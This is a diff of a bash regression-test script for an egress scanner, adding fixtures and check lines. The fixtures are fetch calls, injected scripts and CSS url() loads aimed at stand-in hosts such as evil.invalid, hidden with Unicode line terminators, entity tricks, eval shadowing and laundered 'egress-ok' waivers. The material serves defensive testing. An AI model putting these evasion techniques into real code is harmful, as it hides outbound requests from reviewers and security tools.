+  > "$T/r9csslongsstuncontrol/a.css"
+printf 'a{background:url("%s")}\n' "$(printf '%s%s%s%s%s' 'HT' 'TP' 'S' "$J" 'evil.invalid/uppercase-https')" \
+  > "$T/r9cssupperhttps/a.css"
+printf 'module.exports = {}\n/ [fetch("%sevil.invalid/cjs-module")] / 1\n' "$_pr" \
+  > "$T/r9cjsmoduledivision/a.js"
+printf 'global.config = {}\n/ [fetch("%sevil.invalid/cjs-global")] / 1\n' "$_pr" \
+  > "$T/r9cjsglobaldivision/a.js"
+printf 'namespace.value = {}\n/ [fetch("%sevil.invalid/cjs-namespace")] / 1\n' "$_pr" \
+  > "$T/r9cjsnamespacedivision/a.js"
+printf '<iframe></iframe><script>const real=frames[0].frameElement;const fake={createElement(){return real}};function run(){eval("var document = fake");const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fbare-eval-document%%22%%3E"}run()</script>\n' \
+  > "$T/r9bareevaldocument/a.html"
+printf '<iframe></iframe><script>const real=frames[0].frameElement;const fake={createElement(){return real}};function run(){(eval)("var document = fake");const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fgrouped-eval-document%%22%%3E"}run()</script>\n' \
+  > "$T/r9groupedevaldocument/a.html"
+printf '<iframe></iframe><script>const real=frames[0].frameElement;const fake={createElement(){return real}};function run(){(((eval)))("var document = fake");const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fnested-eval-document%%22%%3E"}run()</script>\n' \
+  > "$T/r9nestedgroupedevaldocument/a.html"
+printf '<iframe></iframe><script>const real=frames[0].frameElement;const fake={document:{createElement(){return real}}};with(fake){const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fwith-document%%22%%3E"}</script>\n' \
+  > "$T/r9withdocument/a.html"
+printf 'class C<T> {}\n/[a//]/.test(x); fetch("%sevil.invalid/class-generic")\n' "$_pr" \
+  > "$T/r9regexclassgeneric/a.ts"
+printf 'class C implements I {}\n/[a//]/.test(x); fetch("%sevil.invalid/class-implements")\n' "$_pr" \
+  > "$T/r9regexclassimplements/a.ts"
+printf 'export default interface I {}\n/[a//]/.test(x); fetch("%sevil.invalid/default-interface")\n' "$_pr" \
+  > "$T/r9regexdefaultinterface/a.ts"
+printf 'interface I<T extends {x:number}> {}\n/[a//]/.test(x); fetch("%sevil.invalid/interface-constraint")\n' "$_pr" \
+  > "$T/r9regexinterfaceconstraint/a.ts"
+printf 'type X = [string]\n/[a//]/.test(x); fetch("%sevil.invalid/type-tuple")\n' "$_pr" \
+  > "$T/r9regextypetuple/a.ts"
+printf 'type X = string | number\n/[a//]/.test(x); fetch("%sevil.invalid/type-union")\n' "$_pr" \
+  > "$T/r9regextypeunion/a.ts"
+printf 'declare const x: number\n/[a//]/.test(x); fetch("%sevil.invalid/declare-const")\n' "$_pr" \
+  > "$T/r9regexdeclareconst/a.ts"
+printf 'declare const value: number;\ntype X = string; value / [fetch("%sevil.invalid/type-tail")] / 1\n' "$_pr" \
+  > "$T/r9regextypetrailingdivision/a.ts"
+printf 'type X = string;\ndeclare const value: number; value / [fetch("%sevil.invalid/declare-tail")] / 1\n' "$_pr" \
+  > "$T/r9regexdeclaretrailingdivision/a.ts"
+printf 'type A = string; type X = number\n/[a//]/.test(x); fetch("%sevil.invalid/multi-type")\n' "$_pr" \
+  > "$T/r9regexmultitypecontrol/a.ts"
+printf 'type X =\n  string | number\n/[a//]/.test(x); fetch("%sevil.invalid/multiline-type")\n' "$_pr" \
+  > "$T/r9regexmultilinetypecontrol/a.ts"
+printf 'declare const value: number\ntype X = string\nvalue / [fetch("%sevil.invalid/type-newline")] / 1\n' "$_pr" \
+  > "$T/r9regextypenewlinetail/a.ts"
+printf 'type X = string\ndeclare const value: number\nvalue / [fetch("%sevil.invalid/ambient-newline")] / 1\n' "$_pr" \
+  > "$T/r9regexdeclarenewlinetail/a.ts"
+printf 'type X =\n  string | number\n/[a//]/.test(x)\n' \
+  > "$T/r9regexmultilineuncertcontrol/a.ts"
+printf 'type X = {\n  a: string\n};\n/[a//]/.test(x)\n' \
+  > "$T/r9regexterminatedmultilinetypecontrol/a.ts"
+printf 'declare function f(\n  x: string\n): void;\n/[a//]/.test(x)\n' \
+  > "$T/r9regexterminatedambientcontrol/a.ts"
+printf 'type X = {\n  a: string\n};\n/[a//]/.test(x); fetch("%sevil.invalid/terminated-type")\n' "$_pr" \
+  > "$T/r9regexterminatedtypefetch/a.ts"
+printf '<iframe></iframe><script>const real=frames[0].frameElement;const fake={createElement(){return real}};const document=fake</script><script>const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fcross-script-document%%22%%3E"</script>\n' \
+  > "$T/r9crossscriptdocument/a.html"
+printf 'const real=window["document"];const fake={createElement(){return real.createElement("iframe")}};const document=fake\n' \
+  > "$T/r9crossfiledocument/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fcross-file-document%%22%%3E";real.body.append(s)\n' \
+  > "$T/r9crossfiledocument/b.js"
+printf '<script>document.head.dataset.ready="1"</script><script>const s=document.createElement("script");s.type="module";s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fmulti-script-global%%22)"</script>\n' \
+  > "$T/r9multiscriptglobalcontrol/a.html"
+# ECMAScript treats a bare carriage return as a line terminator. These fixtures intentionally
+# write raw 0x0D bytes so line comments and import/export regex goals cannot mask the next line.
+printf 'const x=1;// inert\rfetch("%sevil.invalid/cr-comment")\n' "$_pr" \
+  > "$T/r9crlinecomment/a.js"
+printf '<!-- inert\rfetch("%sevil.invalid/cr-html-comment")\n' "$_pr" \
+  > "$T/r9crhtmlcomment/a.js"
+printf 'import x from "./local.js"\r/[a//]/.test(x); fetch("%sevil.invalid/cr-import")\n' "$_pr" \
+  > "$T/r9crimportregex/a.mjs"
+printf 'export {x} from "./local.js"\r/[a//]/.test(x); fetch("%sevil.invalid/cr-export")\n' "$_pr" \
+  > "$T/r9crexportregex/a.mjs"
+printf 'fetch("%sevil.invalid/cr-waiver-launder")\r // egress-ok\n' "$_pr" \
+  > "$T/r9crwaiverlaunder/a.js"
+printf 'fetch("%sreviewed.invalid/cr-same-line"); // egress-ok\r' "$_pr" \
+  > "$T/r9crsamewaiver/a.js"
+# The scanner reads one Latin-1 character per byte to preserve offsets. Emit UTF-8 U+2028/U+2029
+# directly so their three-byte spellings must still behave as ECMAScript line terminators.
+printf 'const x=1;// inert\342\200\250fetch("%sevil.invalid/ls-comment")\n' "$_pr" \
+  > "$T/r9lslinecomment/a.js"
+printf 'const x=1;// inert\342\200\251fetch("%sevil.invalid/ps-comment")\n' "$_pr" \
+  > "$T/r9pslinecomment/a.js"
+printf '<!-- inert\342\200\250fetch("%sevil.invalid/ls-html-comment")\n' "$_pr" \
+  > "$T/r9lshtmlcomment/a.js"
+printf 'import x from "./local.js"\342\200\250/[a//]/.test(x); fetch("%sevil.invalid/ls-import")\n' "$_pr" \
+  > "$T/r9lsimportregex/a.mjs"
+printf 'export {x} from "./local.js"\342\200\251/[a//]/.test(x); fetch("%sevil.invalid/ps-export")\n' "$_pr" \
+  > "$T/r9psexportregex/a.mjs"
+printf 'fetch("%sevil.invalid/ls-waiver-launder")\342\200\250 // egress-ok\n' "$_pr" \
+  > "$T/r9lswaiverlaunder/a.js"
+printf 'fetch("%sreviewed.invalid/ps-same-line"); // egress-ok\342\200\251' "$_pr" \
+  > "$T/r9pssamewaiver/a.js"
+printf 'fetch("%s\\\342\200\250%s%s%sevil.invalid/ls-continuation")\n' \
+  "$_s" "$_t" "$_x" "$J" > "$T/r9lscontinuation/a.js"
+printf 'fetch("%s\\\342\200\251%s%s%sevil.invalid/ps-continuation")\n' \
+  "$_s" "$_t" "$_x" "$J" > "$T/r9pscontinuation/a.js"
+printf 'const s=document.createElement("script")\342\200\250s.type="module"\342\200\250s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fls-asi-module%%22)"\n' \
+  > "$T/r9lsasimodule/a.js"
+printf 'const s=document.createElement("script")\342\200\251if(false)\342\200\251s.type="module"\342\200\251s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fps-asi-conditional%%22)"\n' \
+  > "$T/r9psasiconditional/a.js"
+printf 'const s=document.createElement("script");s.type="module"/*\342\200\250*/s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fls-comment-asi%%22)"\n' \
+  > "$T/r9lsblockcommentasi/a.js"
+# Every multibyte member of ECMAScript WhiteSpace is isolated. The argument is interpreted by
+# printf only when constructing the fixture; U+0085/U+180E/U+200B/U+2060 are negative controls.
+for ws_spec in \
+  'nbsp:\302\240' 'ogham:\341\232\200' \
+  'enquad:\342\200\200' 'emquad:\342\200\201' \
+  'enspace:\342\200\202' 'emspace:\342\200\203' \
+  'threeperem:\342\200\204' 'fourperem:\342\200\205' \
+  'sixperem:\342\200\206' 'figure:\342\200\207' \
+  'punctuation:\342\200\210' 'thin:\342\200\211' \
+  'hair:\342\200\212' 'nnbsp:\342\200\257' \
+  'medium-math:\342\201\237' 'ideographic:\343\200\200' \
+  'bom:\357\273\277'; do
+  ws_name=${ws_spec%%:*}
+  ws_bytes=${ws_spec#*:}
+  mkdir -p "$T/r9jsws-$ws_name"
+  printf 'fetch%b("%sevil.invalid/ws-%s")\n' "$ws_bytes" "$_pr" "$ws_name" \
+    > "$T/r9jsws-$ws_name/a.js"
+done
+for nonws_spec in \
+  'nel:\302\205' 'mongolian-vowel:\341\240\216' \
+  'zero-width:\342\200\213' 'word-joiner:\342\201\240'; do
+  nonws_name=${nonws_spec%%:*}
+  nonws_bytes=${nonws_spec#*:}
+  mkdir -p "$T/r9jsnonws-$nonws_name"
+  printf 'fetch%b("%sdocs.invalid/non-ws-%s")\n' "$nonws_bytes" "$_pr" "$nonws_name" \
+    > "$T/r9jsnonws-$nonws_name/a.js"
+done
+printf '<button onclick="// inert &#x2028;fetch(\047%sentity.invalid/ls-comment\047)">x</button>\n' "$_pr" \
+  > "$T/r9entitylscomment/i.html"
+printf '<button onclick="// inert &#x2029;fetch(\047%sentity.invalid/ps-comment\047)">x</button>\n' "$_pr" \
+  > "$T/r9entitypscomment/i.html"
+printf '<button onclick="fetch&#xa0;(\047%sentity.invalid/nbsp\047)">x</button>\n' "$_pr" \
+  > "$T/r9entitynbspfetch/i.html"
+printf '<button onclick="fetch&#xfeff;(\047%sentity.invalid/bom\047)">x</button>\n' "$_pr" \
+  > "$T/r9entitybomfetch/i.html"
+printf '<iframe srcdoc="&lt;script&gt;// inert &#x2028;fetch(\047%sentity.invalid/srcdoc-ls\047)&lt;/script&gt;"></iframe>\n' "$_pr" \
+  > "$T/r9srcdocentityls/i.html"
+printf '<button onclick="fetch(\047%sevil.invalid/entity-waiver-borrow\047) &#x2028; // egress-ok\n">x</button>\n' "$_pr" \
+  > "$T/r9entitylswaiverborrow/i.html"
+printf '<iframe srcdoc="&lt;script&gt;fetch(\047&sol;&sol;evil.invalid/srcdoc-waiver-borrow\047) &#x2029; // egress-ok\n&lt;/script&gt;"></iframe>\n' \
+  > "$T/r9srcdocpswaiverborrow/i.html"
+printf '<div style=\047background:url("%sevil.invalid/css-cr-borrow")&#13; /* egress-ok */\n\047></div>\n' "$_pr" \
+  > "$T/r9cssentitycrwaiverborrow/i.html"
+printf '<div style=\047background:url("%sevil.invalid/css-lf-borrow")&#10; /* egress-ok */\n\047></div>\n' "$_pr" \
+  > "$T/r9cssentitylfwaiverborrow/i.html"
+printf '<div style=\047background:url("%sevil.invalid/css-ff-borrow")&#12; /* egress-ok */\n\047></div>\n' "$_pr" \
+  > "$T/r9cssentityffwaiverborrow/i.html"
+printf '<button onclick="// inert &#x2028;fetch(\047%sreviewed.invalid/entity-same-runtime-line\047); // egress-ok\n">x</button>\n' "$_pr" \
+  > "$T/r9entitylswaivercontrol/i.html"
+printf '<div style=\047--x:0;&#13;background:url("%sreviewed.invalid/css-same-runtime-line"); /* egress-ok */\n\047></div>\n' "$_pr" \
+  > "$T/r9cssentitycrwaivercontrol/i.html"
+printf 'body{background:url(%sevil.invalid/raw-ff-borrow)}\f /* egress-ok */\n' "$_pr" \
+  > "$T/r9cssrawffwaiverborrow/a.css"
+printf 'body{background:url(%sreviewed.invalid/raw-ff-same)} /* egress-ok */\f' "$_pr" \
+  > "$T/r9cssrawffwaivercontrol/a.css"
 printf 'export default class {}\n/[a//]/.test(x); fetch("%sevil.invalid/anon-class")\n' "$_pr" \
   > "$T/r8regexexportanonclass/a.mjs"
 printf 'export default function () {}\n/[a//]/.test(x); fetch("%sevil.invalid/anon-function")\n' "$_pr" \
@@ -608,6 +1378,16 @@ check_count() { # <label> <want-exit> <want-EGRESS-line-count> -- <scan args...>
   ok "$label"
 }
 
+check_uncert() { # <label> <want-UNCERT-line-count> -- <scan args...>
+  local label="$1" wantc="$2"; shift 2
+  local out got cnt
+  out="$(bash "$SCAN" "$@" 2>&1)"; got=$?
+  cnt="$(printf '%s\n' "$out" | grep -c '^UNCERT ')"
+  if [ "$got" != "1" ]; then no "$label (exit want=1 got=$got)"; return; fi
+  if [ "$cnt" != "$wantc" ]; then no "$label (UNCERT count want=$wantc got=$cnt)"; return; fi
+  ok "$label"
+}
+
 echo "== scan-egress regressions =="
 check "clean tree passes"                       0 ""                  "$T/clean"
 check "non-fetching xmlns is not egress"        0 "NSURI"             "$T/clean"
@@ -654,6 +1434,8 @@ check "protocol-relative IPv6 literal host fails"   1 "EGRESS"       "$T/ipv6"
 check "static import from external fails"           1 "EGRESS"       "$T/esmod"
 check "export-from external fails"                  1 "EGRESS"       "$T/expfrom"
 check "backtick-template fetch fails"               1 "EGRESS"       "$T/btfetch"
+check_count "static tagged-template fetch fails"     1 1              "$T/taggedfetch"
+check_count "bracket-global tagged fetch fails"      1 1              "$T/brackettaggedfetch"
 check "new Worker external script fails"            1 "EGRESS"       "$T/worker"
 check "serviceWorker.register fails"                1 "EGRESS"       "$T/swreg"
 check "location.assign navigation fails"            1 "EGRESS"       "$T/locnav"
@@ -911,6 +1693,344 @@ check_count "optional window location bracket is caught"        1 1 "$T/r8option
 check_count "optional global bracket location is caught"        1 1 "$T/r8optionalglobalbracket"
 check "optional location property without call stays inert"      0 "" "$T/r8optionalpropertycontrol"
 check "replace object key without call stays inert"              0 "" "$T/r8optionalkeycontrol"
+check_count "classic data script with omitted MIME is scanned"   1 1 "$T/r9classicdataomitted"
+check_count "classic data script with text/plain is scanned"     1 1 "$T/r9classicdataplain"
+check_count "classic data script ignores arbitrary MIME"         1 1 "$T/r9classicdataarbitrarymime"
+check_count "explicit classic type ignores response MIME"        1 1 "$T/r9classictypedata"
+check_count "empty script type remains classic"                  1 1 "$T/r9classicemptytype"
+check "module data script rejects omitted MIME"                  0 "" "$T/r9moduledataomitted"
+check "module data script rejects text/plain"                    0 "" "$T/r9moduledataplain"
+check_count "module data script accepts JavaScript MIME"         1 1 "$T/r9moduledatajavascript"
+check "non-JavaScript script type stays an inert data block"     0 "" "$T/r9datablocksrccontrol"
+check_count "classic Worker data omitted MIME is scanned"        1 1 "$T/r9workeromitted"
+check_count "classic Worker data text/plain is scanned"          1 1 "$T/r9workerplain"
+check_count "classic SharedWorker data text/plain is scanned"    1 1 "$T/r9sharedworkerplain"
+check "module Worker data text/plain stays inert"                0 "" "$T/r9workermoduleplain"
+check "module SharedWorker data text/plain stays inert"          0 "" "$T/r9sharedworkermoduleplain"
+check_count "module Worker JavaScript MIME is scanned"           1 1 "$T/r9workermodulejavascript"
+check_count "module SharedWorker JavaScript MIME is scanned"     1 1 "$T/r9sharedworkermodulejavascript"
+check_count "importScripts data omitted MIME is scanned"         1 1 "$T/r9importscriptsomitted"
+check_count "importScripts data text/plain is scanned"           1 1 "$T/r9importscriptsplain"
+check_count "importScripts data JavaScript MIME is scanned"      1 1 "$T/r9importscriptsjavascript"
+check "dynamic import data omitted MIME stays inert"             0 "" "$T/r9dynamicimportomitted"
+check "dynamic import data text/plain stays inert"               0 "" "$T/r9dynamicimportplain"
+check_count "bracket Worker uses classic data MIME policy"       1 1 "$T/r9bracketworkerplain"
+check "bracket module SharedWorker keeps strict MIME"            0 "" "$T/r9bracketsharedmoduleplain"
+check_count "tracked dynamic classic script src is scanned"      1 1 "$T/r9dynamicscriptsrc"
+check_count "tracked dynamic classic script setter is scanned"   1 1 "$T/r9dynamicscriptsetter"
+check "tracked dynamic module rejects text/plain"                0 "" "$T/r9dynamicscriptmoduleplain"
+check_count "tracked dynamic module accepts JavaScript MIME"     1 1 "$T/r9dynamicscriptmodulejavascript"
+check "tracked setter module rejects text/plain"                 0 "" "$T/r9dynamicsettermoduleplain"
+check "tracked dynamic data-block src stays inert"               0 "" "$T/r9dynamicscriptdatablock"
+check "dynamic image src data payload stays non-executable"      0 "" "$T/r9dynamicimagesrccontrol"
+check_count "immediate dynamic classic script src is scanned"    1 1 "$T/r9immediatescriptsrc"
+check_count "valueless first type keeps duplicate script classic" 1 1 "$T/r9valuelesstypeduplicate"
+check_count "valueless first language keeps script classic"      1 1 "$T/r9valuelesslanguageduplicate"
+check_count "removeAttribute type restores classic script"       1 1 "$T/r9scriptremovetype"
+check_count "bracket type mutation restores classic script"      1 1 "$T/r9scriptbrackettype"
+check "setAttributeNS module keeps strict response MIME"          0 "" "$T/r9scriptsetattributensmodule"
+check_count "removeAttributeNS type restores classic script"     1 1 "$T/r9scriptremoveattributens"
+check_count "toggleAttribute type fails closed to classic"       1 1 "$T/r9scripttoggletype"
+check "parameterized script type is a data block"               0 "" "$T/r9classictypeparams"
+check_count "importScripts scans every URL argument"             1 1 "$T/r9importscriptssecond"
+check_count "bracket importScripts scans every URL argument"     1 1 "$T/r9bracketimportscriptssecond"
+check_count "tracked bracket script src is scanned"              1 1 "$T/r9bracketscriptsrc"
+check_count "tracked bracket script setter is scanned"           1 1 "$T/r9bracketscriptsetter"
+check "inline non-JavaScript script body stays inert"            0 "" "$T/r9inlinejsoncontrol"
+check "module Worker trailing comma keeps strict MIME"           0 "" "$T/r9workermoduletrailing"
+check "module Worker quoted type keeps strict MIME"              0 "" "$T/r9workermodulequoted"
+check "module Worker before static option keeps strict MIME"     0 "" "$T/r9workermodulebeforeother"
+check_count "immediate bracket script src is scanned"           1 1 "$T/r9immediatebracketsrc"
+check_count "immediate bracket script setter is scanned"        1 1 "$T/r9immediatebracketsetter"
+check "module Worker escaped type keeps strict MIME"            0 "" "$T/r9workermoduleescaped"
+check_count "optional bracket importScripts scans every URL"    1 1 "$T/r9optionalbracketimportscripts"
+check_count "bracket removeAttribute restores classic script"   1 1 "$T/r9bracketremovetype"
+check_count "bracket removeAttributeNS restores classic script" 1 1 "$T/r9bracketremoveattributens"
+check_count "bracket toggleAttribute restores classic script"   1 1 "$T/r9brackettoggletype"
+check "bracket setAttribute module keeps strict MIME"           0 "" "$T/r9bracketsettypemodule"
+check "bracket setAttributeNS module keeps strict MIME"         0 "" "$T/r9bracketsetnstypemodule"
+check_count "Worker getter can override module to classic"      1 1 "$T/r9workergetterclassic"
+check_count "Worker setter-only override defaults classic"      1 1 "$T/r9workersetterclassic"
+check_count "shadowed image then script binding fails closed"   1 1 "$T/r9shadowimgscript"
+check_count "shadowed script then image binding fails closed"   1 1 "$T/r9shadowscriptimg"
+check_count "shadowed script state fails closed"                1 1 "$T/r9shadowscriptscript"
+check_count "this bracket importScripts scans every URL"        1 1 "$T/r9thisimportscripts"
+check_count "optional this importScripts scans every URL"       1 1 "$T/r9optionalthisimportscripts"
+check_count "SharedWorker getter overrides module to classic"   1 1 "$T/r9sharedworkergetterclassic"
+check_count "bracket non-null namespace leaves script classic"  1 1 "$T/r9bracketsetnsnonnull"
+check_count "dot non-null namespace leaves script classic"      1 1 "$T/r9dotsetnsnonnull"
+check "bracket non-null namespace leaves module intact"         0 "" "$T/r9bracketremovensnonnull"
+check "dot non-null namespace leaves module intact"             0 "" "$T/r9dotremovensnonnull"
+check "empty namespace setAttributeNS updates script type"      0 "" "$T/r9setnsemptymodule"
+check_count "import map remote target is caught"                1 1 "$T/r9importmapremote"
+check_count "import map executable data target is scanned"      1 1 "$T/r9importmapdata"
+check_count "speculation-rules prefetch target is caught"       1 1 "$T/r9speculationrulesremote"
+check_count "conditional module mutation fails closed"          1 1 "$T/r9conditionalmodule"
+check_count "uncalled-function mutation fails closed"           1 1 "$T/r9functionmodule"
+check_count "conditional data-block mutation fails closed"      1 1 "$T/r9conditionaldatablock"
+check "external script ignores inline child text"               0 "" "$T/r9externalscriptbodycontrol"
+check_count "called nested mutation stays conservatively unknown" 1 1 "$T/r9nestedcalledremove"
+check_count "parenthesized this importScripts is caught"        1 1 "$T/r9parenthisimport"
+check_count "parenthesized member callee importScripts is caught" 1 1 "$T/r9parentmemberimport"
+check_count "parenthesized fetch callee is caught"              1 1 "$T/r9parentfetch"
+check_count "parenthesized Worker constructor is caught"        1 1 "$T/r9parentworker"
+check_count "parenthesized bracket Worker is caught"            1 1 "$T/r9parentglobalworker"
+check_count "parenthesized tracked script src is caught"        1 1 "$T/r9parentscriptsrc"
+check_count "appendChild-returned script src is caught"         1 1 "$T/r9appendchildscriptsrc"
+check_count "parenthesized removeAttribute restores classic"    1 1 "$T/r9parentremoval"
+check_count "optional receiver removeAttribute is caught"       1 1 "$T/r9optionalreceiverremove"
+check_count "optional call removeAttribute is caught"           1 1 "$T/r9optionalcallremove"
+check_count "uppercase NS local-name leaves script classic"     1 1 "$T/r9namespaceuppercase"
+check "uppercase NS removal leaves module intact"               0 "" "$T/r9namespaceremoveuppercase"
+check_count "uppercase property does not mutate script type"    1 1 "$T/r9uppercaseproperty"
+check_count "uppercase bracket property does not mutate type"   1 1 "$T/r9uppercasebracketproperty"
+check_count "uppercase setter method does not mutate type"      1 1 "$T/r9uppercasesettermethod"
+check_count "uppercase bracket setter does not mutate type"     1 1 "$T/r9uppercasebracketsetter"
+check_count "unrecognized remover ends the state proof"         1 1 "$T/r9uppercaseremovercontrol"
+check_count "nested parenthesized fetch is caught"              1 1 "$T/r9nestedparenfetch"
+check_count "parenthesized optional location call is caught"    1 1 "$T/r9parenlocationassign"
+check_count "parenthesized optional window open is caught"      1 1 "$T/r9parenwindowopen"
+check_count "parenthesized service-worker register is caught"   1 1 "$T/r9parenserviceregister"
+check_count "parenthesized XHR open is caught"                  1 1 "$T/r9parenxhropen"
+check_count "parenthesized location bracket is caught"          1 1 "$T/r9parenlocationbracket"
+check_count "parenthesized global location assignment is caught" 1 1 "$T/r9parenglobaldotlocation"
+check_count "parenthesized appendChild script src is caught"    1 1 "$T/r9parenappendchildsrc"
+check_count "uppercase Worker option key stays classic"         1 1 "$T/r9workeruppercasekey"
+check_count "uppercase Worker type value stays classic"         1 1 "$T/r9workeruppercasevalue"
+check_count "padded Worker type value stays classic"            1 1 "$T/r9workerpaddedvalue"
+check_count "grouped fetch argument is caught"                  1 1 "$T/r9groupedfetcharg"
+check_count "grouped importScripts key and value are caught"    1 1 "$T/r9groupedimportkey"
+check_count "grouped location key and value are caught"         1 1 "$T/r9groupedlocationkey"
+check_count "grouped tracked script key and value are caught"   1 1 "$T/r9groupedscriptsrckey"
+check_count "grouped dot-assignment value is caught"            1 1 "$T/r9groupedsrcvalue"
+check_count "grouped setter key and arguments are caught"       1 1 "$T/r9groupedsetterargs"
+check "grouped ordinary string remains inert"                   0 "" "$T/r9groupedstringcontrol"
+check "grouped Worker module option keeps strict MIME"          0 "" "$T/r9groupedworkermodule"
+check "grouped script type assignment keeps strict MIME"        0 "" "$T/r9groupedtypemodule"
+check "grouped script type setter keeps strict MIME"            0 "" "$T/r9groupedsettypemodule"
+check_count "CSS import url data payload is scanned"            1 1 "$T/r9cssimporturldata"
+check_count "unquoted CSS import url data payload is scanned"   1 1 "$T/r9cssimporturlunquoted"
+check "ordinary CSS url data payload is not executed as CSS"    0 "" "$T/r9cssbackgrounddatacontrol"
+check_count "stylesheet link data CSS is scanned"               1 1 "$T/r9linkstylesheetdata"
+check_count "alternate stylesheet data CSS is scanned"         1 1 "$T/r9linkalternatestylesheetdata"
+check "icon link data payload is not executed as CSS"           0 "" "$T/r9linkicondata"
+check "preload link data payload is not executed as CSS"        0 "" "$T/r9linkpreloaddata"
+check_count "direct remote icon href is still egress"           1 1 "$T/r9linkiconremote"
+check_count "dot XLink setter scans namespace and target"       1 2 "$T/r9xlinkdot"
+check_count "bracket XLink setter scans namespace and target"   1 2 "$T/r9xlinkbracket"
+check "arbitrary namespaced href is not a known fetch sink"     0 "" "$T/r9xlinkothernscontrol"
+check "known dynamic image data HTML remains non-executable"    0 "" "$T/r9dynamicimghtmlcontrol"
+check "known bracket image data HTML remains non-executable"    0 "" "$T/r9dynamicimgbracketcontrol"
+check "known image setter data HTML remains non-executable"     0 "" "$T/r9dynamicimgsettercontrol"
+check_count "known dynamic image remote URL is still egress"    1 1 "$T/r9dynamicimgremote"
+check_count "unknown data src stays conservative"               1 1 "$T/r9unknownsrchtml"
+check_count "known iframe data document is scanned"             1 1 "$T/r9dynamiciframehtml"
+check "grouped module Worker options keep strict MIME"          0 "" "$T/r9workeroptionsgrouped"
+check_count "comma Worker options remain conservative"          1 1 "$T/r9workeroptionscomma"
+check "ASI module assignment keeps strict MIME"                 0 "" "$T/r9asimodule"
+check_count "conditional ASI mutation stays conservative"       1 1 "$T/r9asiconditional"
+check "import-map URL-like key does not fetch"                   0 "" "$T/r9importmapkeycontrol"
+check "import-map scope key does not fetch"                      0 "" "$T/r9importmapscopekeycontrol"
+check_count "escaped CSS url identifier is normalized"          1 1 "$T/r9cssescapedurl"
+check_count "escaped CSS import at-keyword is normalized"       1 1 "$T/r9cssescapedimport"
+check_count "escaped CSS data scheme is normalized"             1 1 "$T/r9cssescapeddatascheme"
+check "escaped ordinary CSS string remains inert"                0 "" "$T/r9cssescapedstringcontrol"
+check "vertical-tab rel byte is not HTML whitespace"             0 "" "$T/r9relvtcontrol"
+check "NBSP rel character is not HTML whitespace"                0 "" "$T/r9relnbspcontrol"
+check "em-space rel character is not HTML whitespace"            0 "" "$T/r9relemspcontrol"
+check_count "ASCII-tab rel separator activates stylesheet"       1 1 "$T/r9reltabstylesheet"
+check_count "direct type expression stays conservative"          1 1 "$T/r9directtypeexpression"
+check_count "bracket type expression stays conservative"         1 1 "$T/r9brackettypeexpression"
+check_count "newline-continuation type stays conservative"        1 1 "$T/r9newlinetypeexpression"
+check "bare-CR ASI module assignment keeps strict MIME"           0 "" "$T/r9asicrmodule"
+check_count "bare-CR conditional mutation stays conservative"     1 1 "$T/r9asicrconditional"
+check_count "lexically shadowed image stays conservative"         1 1 "$T/r9imageshadow"
+check_count "parameter-shadowed image stays conservative"         1 1 "$T/r9imageparametershadow"
+check_count "unknown namespace href stays conservative"           1 1 "$T/r9unknownxlinknamespace"
+check_count "CSS escaped line continuation is normalized"        1 1 "$T/r9cssescapedlinecontinuation"
+check_count "concatenated type assignment stays conservative"     1 1 "$T/r9directtypeconcat"
+check_count "arrow-shadowed image stays conservative"              1 1 "$T/r9imagearrowshadow"
+check_count "bracket unknown namespace href stays conservative"   1 1 "$T/r9unknownxlinkbracket"
+check_count "unquoted CSS data URL escapes are normalized"         1 1 "$T/r9cssunquotedescapeddata"
+check_count "unquoted CSS remote URL escapes are normalized"       1 1 "$T/r9cssunquotedescapedremote"
+check "CSS identifier escape may not cross a newline"              0 "" "$T/r9cssinvalidescapedimportcontrol"
+check "CSS function escape may not cross a newline"                0 "" "$T/r9cssinvalidescapedurlcontrol"
+check_count "CSS bad-string newline exposes following URL"         1 1 "$T/r9cssbadstringrecovery"
+check_count "image identity requires the complete initializer"     1 1 "$T/r9imageinitializerand"
+check_count "script identity requires the complete initializer"    1 1 "$T/r9scriptinitializerand"
+check_count "iframe identity requires the complete initializer"    1 1 "$T/r9iframeinitializerscript"
+check_count "array-destructured image shadow stays conservative"   1 1 "$T/r9imagearraydestructure"
+check_count "object-destructured image shadow stays conservative"  1 1 "$T/r9imageobjectdestructure"
+check_count "nested-default image shadow stays conservative"       1 1 "$T/r9imagenesteddefaultshadow"
+check_count "dynamic template direct type stays conservative"      1 1 "$T/r9dynamicdirecttype"
+check_count "dynamic template bracket type stays conservative"     1 1 "$T/r9dynamicbrackettype"
+check_count "dynamic template setter type stays conservative"      1 1 "$T/r9dynamicsettype"
+check_count "dynamic template setter name stays conservative"      1 1 "$T/r9dynamicsettypename"
+check_count "dynamic template element name stays conservative"     1 1 "$T/r9dynamiccreateelement"
+check "unquoted CSS token escape may not cross a newline"          0 "" "$T/r9cssinvalidunquotedcontinuation"
+check_count "CSS bad-string form feed exposes following URL"       1 1 "$T/r9cssbadstringff"
+check_count "script alias shadow ends tracked state"                1 1 "$T/r9scriptaliasshadow"
+check_count "mutable non-script identity cannot authorize later use" 1 1 "$T/r9letiframeintoscript"
+check_count "iframe lexical alias to script stays conservative"     1 1 "$T/r9iframealiasscript"
+check_count "iframe arrow alias to script stays conservative"       1 1 "$T/r9iframearrowaliasscript"
+check_count "script lexical alias to iframe stays conservative"     1 1 "$T/r9scriptaliasiframe"
+check_count "script arrow alias to iframe stays conservative"       1 1 "$T/r9scriptarrowaliasiframe"
+check_count "intervening statement ends script state proof"         1 1 "$T/r9scriptinterveningstatement"
+check_count "setter argument side effect ends state proof"           1 1 "$T/r9preservesettersideeffect"
+check_count "namespaced setter side effect ends state proof"         1 1 "$T/r9preservenssideeffect"
